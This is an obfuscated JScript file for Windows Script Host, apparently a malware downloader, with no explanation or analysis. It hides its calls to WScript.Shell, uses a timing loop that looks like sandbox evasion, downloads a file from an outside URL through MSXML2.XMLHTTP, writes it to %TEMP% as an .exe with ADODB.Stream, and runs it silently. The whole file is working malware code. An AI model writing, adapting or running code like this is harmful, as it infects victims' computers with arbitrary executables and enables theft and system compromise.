var _QW = false;
var _AL = "CreateObject";
var _EU = function _GN() {return WScript[_AL]("WScript"+".Shell");}(), _YP = 11;
var _LN = "MSXML2.XMLHTTP";
var _YE = 2123213;
var _YA = 0;
function _ZH(_MK){_EU["Run"](_MK, _YA, _YA);};
function _F(){return _LN + "";};
function _Q(_AT, _R){_YA = _YA * 1; return _AT - _R;};
function _MR0(){return _AL;};
/*@cc_on
  @if (@_win32 || @_win64)
    _QW = true;
  @end
@*/
if (_QW)
{
var _X = "";
function _S(){return 22;};
var _D0 = 0; var _XU = 0;
function _L()
{
var _TS = new this["Date"]();
var _CS = _TS["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _TS = new this["Date"]();
var _X0 = _TS["getUTCMilliseconds"]();
WScript["Sleep"](_S());
var _TS = new this["Date"]();
var _H = _TS["getUTCMilliseconds"]();
var _D0 = "_M";
_D0 = _Q(_X0, _CS);
var _XU = "_WN";
_XU = _Q(_H, _X0);
_X = "open";
return _Q(_D0, _XU);
}
var _W = false;
var _I = false;
for (var _SV = _YA; _SV < _S() * 1; _SV++){if (_L() != _YA){
_W = true; 
_XU = "31" + 11 * _D0 + _XU; 
_I = true; 
break;
}}
function _MR() {return ((_W == true) && (_W == _I)) ? 1 : _YA;};
if (_W && _MR() && _I){
function _T() {return _EU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "RDkgrD2W.ex" + "e";};
 _YT0 = _F();
 _YT = WScript[_AL](_YT0);
 var _NR = 1;
 while (_NR){
try {
	if (_NR == 1)
	{
		_YT[_X]("GET", "http://srijanexportstowelwarmers.co.uk/k9owpa", false);
		_YT["send"]();
		_D = "Sleep";
	}
	WScript[_D](_S() + 120); 
	if (_YT["readystate"] < 2 * 2) continue;
	_NR = _YA;
	function _IX(_LC) {var _DT = (1, 2, 3, 4, 5, _LC); return _DT;};
	_A = WScript[_MR0()]("ADODB.Stream");
	_YT0 = _A;
	_YT0[_X]();
	_YT0["type"] = _IX(1);
	_YT0["write"](_YT["ResponseBody"]);
	_A["position"] = _IX(_YA);
	_YT0["Save" + "ToFile"](_T(), 2);
	_A["cl"+"ose"]();
	_WG = _T();
	_ZH(_WG);
} catch(_SN){};
}
}
}

